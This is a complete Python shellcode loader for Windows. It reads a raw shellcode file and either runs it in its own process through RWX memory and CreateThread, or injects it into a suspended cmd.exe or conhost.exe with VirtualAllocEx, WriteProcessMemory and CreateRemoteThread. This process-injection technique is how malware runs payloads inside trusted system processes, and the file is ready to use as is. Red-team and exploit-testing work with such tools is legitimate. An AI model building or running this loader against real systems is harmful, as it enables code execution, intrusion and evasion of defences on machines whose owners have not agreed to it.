#!/usr/bin/env python3
"""
Cross-platform shellcode loader for Windows
Supports: x86 (i386), amd64 (x86_64), arm64 (aarch64)

Uses process injection to run shellcode of any architecture from any Python interpreter.

Usage:
    python Loader.py -x86 shellcode.bin
    python Loader.py -amd64 shellcode.bin
    python Loader.py -arm64 shellcode.bin
"""

import argparse
import ctypes
import os
import platform
import struct
import sys
from ctypes import wintypes

# Windows API constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = 0x1F0FFF
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x00000004
CREATE_NO_WINDOW = 0x08000000

# Architecture mappings
ARCH_MAP = {
    'x86': {'bits': 32, 'names': ('i386', 'x86')},
    'i386': {'bits': 32, 'names': ('i386', 'x86')},
    'amd64': {'bits': 64, 'names': ('AMD64', 'x86_64')},
    'x86_64': {'bits': 64, 'names': ('AMD64', 'x86_64')},
    'x64': {'bits': 64, 'names': ('AMD64', 'x86_64')},
    'arm64': {'bits': 64, 'names': ('ARM64', 'aarch64')},
    'aarch64': {'bits': 64, 'names': ('ARM64', 'aarch64')},
}

# Host processes for injection by architecture (console apps preferred for output)
HOST_PROCESSES = {
    'x86': [
        r'C:\Windows\SysWOW64\cmd.exe',
        r'C:\Windows\SysWOW64\conhost.exe',
    ],
    'amd64': [
        r'C:\Windows\System32\cmd.exe',
        r'C:\Windows\System32\conhost.exe',
    ],
    'arm64': [
        r'C:\Windows\System32\cmd.exe',
        r'C:\Windows\System32\conhost.exe',
    ],
}


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]


def get_python_bitness():
    """Get the bitness of the current Python interpreter."""
    return struct.calcsize("P") * 8


def get_os_arch():
    """Get the OS architecture."""
    machine = platform.machine().lower()
    if machine in ('amd64', 'x86_64'):
        return 'amd64'
    elif machine in ('arm64', 'aarch64'):
        return 'arm64'
    elif machine in ('i386', 'i686', 'x86'):
        return 'x86'
    return machine


def normalize_arch(arch):
    """Normalize architecture name to x86/amd64/arm64."""
    arch = arch.lower()
    if arch in ('x86', 'i386'):
        return 'x86'
    elif arch in ('amd64', 'x64', 'x86_64'):
        return 'amd64'
    elif arch in ('arm64', 'aarch64'):
        return 'arm64'
    return arch


def needs_injection(target_arch):
    """Check if we need process injection (architecture mismatch)."""
    target = normalize_arch(target_arch)
    python_bits = get_python_bitness()
    target_bits = ARCH_MAP.get(target, {}).get('bits', 64)

    return python_bits != target_bits


def find_host_process(target_arch):
    """Find a suitable host process for the target architecture."""
    target = normalize_arch(target_arch)
    os_arch = get_os_arch()

    # On 32-bit OS, can only run 32-bit
    if os_arch == 'x86' and target != 'x86':
        raise ValueError(f"Cannot run {target} shellcode on 32-bit OS")

    candidates = HOST_PROCESSES.get(target, [])

    for path in candidates:
        if os.path.exists(path):
            return path

    raise FileNotFoundError(f"No suitable host process found for {target} architecture")


def load_shellcode(filepath):
    """Load shellcode from file."""
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"Shellcode file not found: {filepath}")

    with open(filepath, 'rb') as f:
        shellcode = f.read()

    if len(shellcode) == 0:
        raise ValueError("Shellcode file is empty")

    return shellcode


def setup_kernel32():
    """Setup kernel32 function prototypes."""
    kernel32 = ctypes.windll.kernel32

    # VirtualAlloc
    kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAlloc.restype = wintypes.LPVOID

    # VirtualAllocEx
    kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAllocEx.restype = wintypes.LPVOID

    # VirtualFreeEx
    kernel32.VirtualFreeEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]
    kernel32.VirtualFreeEx.restype = wintypes.BOOL

    # WriteProcessMemory
    kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.WriteProcessMemory.restype = wintypes.BOOL

    # CreateProcessW
    kernel32.CreateProcessW.argtypes = [
        wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR,
        ctypes.POINTER(STARTUPINFO), ctypes.POINTER(PROCESS_INFORMATION)
    ]
    kernel32.CreateProcessW.restype = wintypes.BOOL

    # CreateRemoteThread
    kernel32.CreateRemoteThread.argtypes = [
        wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
        wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID
    ]
    kernel32.CreateRemoteThread.restype = wintypes.HANDLE

    # RtlMoveMemory
    kernel32.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]
    kernel32.RtlMoveMemory.restype = None

    # CreateThread
    kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    kernel32.CreateThread.restype = wintypes.HANDLE

    # WaitForSingleObject
    kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    kernel32.WaitForSingleObject.restype = wintypes.DWORD

    # GetExitCodeThread
    kernel32.GetExitCodeThread.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    kernel32.GetExitCodeThread.restype = wintypes.BOOL

    # GetExitCodeProcess
    kernel32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, wintypes.LPDWORD]
    kernel32.GetExitCodeProcess.restype = wintypes.BOOL

    # TerminateProcess
    kernel32.TerminateProcess.argtypes = [wintypes.HANDLE, wintypes.UINT]
    kernel32.TerminateProcess.restype = wintypes.BOOL

    # CloseHandle
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL

    # ResumeThread
    kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
    kernel32.ResumeThread.restype = wintypes.DWORD

    # GetLastError
    kernel32.GetLastError.argtypes = []
    kernel32.GetLastError.restype = wintypes.DWORD

    return kernel32


def execute_local(kernel32, shellcode):
    """Execute shellcode in current process (matching architecture)."""
    shellcode_size = len(shellcode)

    print(f"[*] Allocating {shellcode_size} bytes of executable memory...")
    ptr = kernel32.VirtualAlloc(None, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    if not ptr:
        raise OSError(f"VirtualAlloc failed: {kernel32.GetLastError()}")

    print(f"[+] Memory allocated at: 0x{ptr:016x}")

    print("[*] Copying shellcode...")
    kernel32.RtlMoveMemory(ptr, shellcode, shellcode_size)

    print("[*] Creating execution thread...")
    thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)

    if not thread:
        raise OSError(f"CreateThread failed: {kernel32.GetLastError()}")

    print(f"[+] Thread handle: 0x{thread:x}")
    print("[*] Waiting for completion...")

    kernel32.WaitForSingleObject(thread, INFINITE)

    exit_code = wintypes.DWORD()
    kernel32.GetExitCodeThread(thread, ctypes.byref(exit_code))
    kernel32.CloseHandle(thread)

    return exit_code.value


def execute_injected(kernel32, shellcode, target_arch):
    """Execute shellcode via process injection (cross-architecture)."""
    shellcode_size = len(shellcode)

    # Find host process
    host_path = find_host_process(target_arch)
    print(f"[*] Using host process: {host_path}")

    # Setup startup info to inherit console
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()

    # Create suspended process - inherit handles for console I/O
    print("[*] Creating suspended host process (with console inheritance)...")
    success = kernel32.CreateProcessW(
        host_path,              # lpApplicationName
        None,                   # lpCommandLine
        None,                   # lpProcessAttributes
        None,                   # lpThreadAttributes
        True,                   # bInheritHandles - inherit console handles
        CREATE_SUSPENDED,       # dwCreationFlags - no CREATE_NO_WINDOW
        None,                   # lpEnvironment
        None,                   # lpCurrentDirectory
        ctypes.byref(si),
        ctypes.byref(pi)
    )

    if not success:
        raise OSError(f"CreateProcessW failed: {kernel32.GetLastError()}")

    print(f"[+] Process created - PID: {pi.dwProcessId}, Handle: 0x{pi.hProcess:x}")

    try:
        # Allocate memory in remote process
        print(f"[*] Allocating {shellcode_size} bytes in remote process...")
        remote_mem = kernel32.VirtualAllocEx(
            pi.hProcess, None, shellcode_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )

        if not remote_mem:
            raise OSError(f"VirtualAllocEx failed: {kernel32.GetLastError()}")

        print(f"[+] Remote memory at: 0x{remote_mem:08x}")

        # Write shellcode
        print("[*] Writing shellcode to remote process...")
        written = ctypes.c_size_t()
        success = kernel32.WriteProcessMemory(
            pi.hProcess, remote_mem, shellcode, shellcode_size, ctypes.byref(written)
        )

        if not success:
            raise OSError(f"WriteProcessMemory failed: {kernel32.GetLastError()}")

        print(f"[+] Written {written.value} bytes")

        # Create remote thread to execute shellcode
        print("[*] Creating remote thread...")
        print("[*] " + "=" * 50)
        print("[*] SHELLCODE OUTPUT BEGIN")
        print("[*] " + "=" * 50)

        remote_thread = kernel32.CreateRemoteThread(
            pi.hProcess, None, 0, remote_mem, None, 0, None
        )

        if not remote_thread:
            raise OSError(f"CreateRemoteThread failed: {kernel32.GetLastError()}")

        # Wait for shellcode to complete
        kernel32.WaitForSingleObject(remote_thread, INFINITE)

        print("[*] " + "=" * 50)
        print("[*] SHELLCODE OUTPUT END")
        print("[*] " + "=" * 50)

        exit_code = wintypes.DWORD()
        kernel32.GetExitCodeThread(remote_thread, ctypes.byref(exit_code))
        kernel32.CloseHandle(remote_thread)

        print(f"[+] Shellcode completed with exit code: {exit_code.value}")
        return exit_code.value

    finally:
        # Cleanup: terminate and close handles
        kernel32.TerminateProcess(pi.hProcess, 0)
        kernel32.CloseHandle(pi.hThread)
        kernel32.CloseHandle(pi.hProcess)


def execute_shellcode_windows(shellcode, target_arch):
    """Execute shellcode on Windows."""
    kernel32 = setup_kernel32()

    if needs_injection(target_arch):
        print(f"[*] Architecture mismatch - using process injection")
        return execute_injected(kernel32, shellcode, target_arch)
    else:
        print(f"[*] Architecture match - executing locally")
        return execute_local(kernel32, shellcode)


def main():
    parser = argparse.ArgumentParser(
        description='Cross-platform shellcode loader for Windows',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    python Loader.py -x86 shellcode.bin
    python Loader.py -amd64 shellcode.bin
    python Loader.py -arm64 shellcode.bin
        '''
    )

    arch_group = parser.add_mutually_exclusive_group(required=True)
    arch_group.add_argument('-x86', '-i386', action='store_const', const='x86', dest='arch',
                           help='Execute x86 (32-bit) shellcode')
    arch_group.add_argument('-amd64', '-x64', '-x86_64', action='store_const', const='amd64', dest='arch',
                           help='Execute amd64 (64-bit) shellcode')
    arch_group.add_argument('-arm64', '-aarch64', action='store_const', const='arm64', dest='arch',
                           help='Execute ARM64 shellcode')
    arch_group.add_argument('--arch', '-a', type=str,
                           choices=['x86', 'i386', 'amd64', 'x64', 'x86_64', 'arm64', 'aarch64'],
                           help='Specify architecture explicitly')

    parser.add_argument('shellcode', type=str, help='Path to shellcode binary file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()

    print(f"[*] Shellcode Loader")
    print(f"[*] Target architecture: {args.arch}")
    print(f"[*] Shellcode file: {args.shellcode}")
    print(f"[*] Current platform: {platform.system()} {platform.machine()}")
    print(f"[*] Python bitness: {get_python_bitness()}-bit")
    print()

    # Load shellcode
    try:
        shellcode = load_shellcode(args.shellcode)
        print(f"[+] Loaded {len(shellcode)} bytes of shellcode")

        if args.verbose:
            print(f"[*] First 32 bytes: {shellcode[:32].hex()}")
    except (FileNotFoundError, ValueError) as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

    # Execute
    current_platform = platform.system().lower()

    if current_platform != 'windows':
        print(f"[-] This loader only supports Windows (current: {current_platform})")
        sys.exit(1)

    try:
        exit_code = execute_shellcode_windows(shellcode, args.arch)
        print(f"\n[+] Final exit code: {exit_code}")
        sys.exit(exit_code)

    except OSError as e:
        print(f"[-] Execution failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
